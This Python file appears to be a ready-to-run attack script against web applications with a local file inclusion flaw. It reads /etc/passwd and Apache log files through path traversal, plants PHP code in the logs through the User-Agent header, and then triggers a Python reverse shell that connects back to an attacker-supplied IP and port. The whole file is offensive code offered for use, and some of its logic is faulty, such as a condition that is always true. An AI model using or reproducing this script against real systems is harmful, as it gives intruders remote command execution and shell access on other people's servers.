import requests
import sys

url = input("enter the url -> ")

ip, port = sys.argv[1], sys.argv[2]


print ("usage : lfi.py 109.182.32.1 4444")

parms = [
    "../../../../../../../../../../../../../../../../../../etc/passwd",
    #"../../../../../../../../../../../../../../../../../../etc/passwd%00"
]

logs = [
    "../../../../../../../../../../../../../../../../../../apache/logs/access.log",
    "../../../../../../../../../../../../../../../../../../apache/logs/access.log%00",
    "../../../../../../../../../../../../../../../../../../apache/logs/error.log",
    "../../../../../../../../../../../../../../../../../../etc/httpd/logs/acces_log",
    "../../../../../../../../../../../../../../../../../../etc/httpd/logs/acces_log%00",
    "../../../../../../../../../../../../../../../../../../etc/httpd/logs/error_log",
    "../../../../../../../../../../../../../../../../../../var/www/logs/access_log,"
    "../../../../../../../../../../../../../../../../../../var/www/logs/access_log%00",
    "../../../../../../../../../../../../../../../../../../usr/local/apache/logs/access_log",
    "../../../../../../../../../../../../../../../../../../var/log/apache/access_log",
    "../../../../../../../../../../../../../../../../../../var/log/apache2/access_log",
    "../../../../../../../../../../../../../../../../../../var/log/apache/access.log",
    "../../../../../../../../../../../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../../../../../../../../../../../var/log/access_log",
]

header ={
    "User-Agent": "Mozilla/5.0 <?php system($_GET['cmd']); ?>"
}


cmd = f"""
export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
"""
if url.index("=") == len(url) - 1:
    for parm in parms:
        r = requests.get(url + parm)
        if "root" or "nologin" or "bash" in r.text:
            for log in logs :
                r = requests.get(url + log)
                if "GET" in r.text:
                    r = requests.get(url + log, headers=header)
                    r = requests.get(url + log + f"&cmd={cmd}")



else:
    print ("ex: http://example.com/index.php?page=")
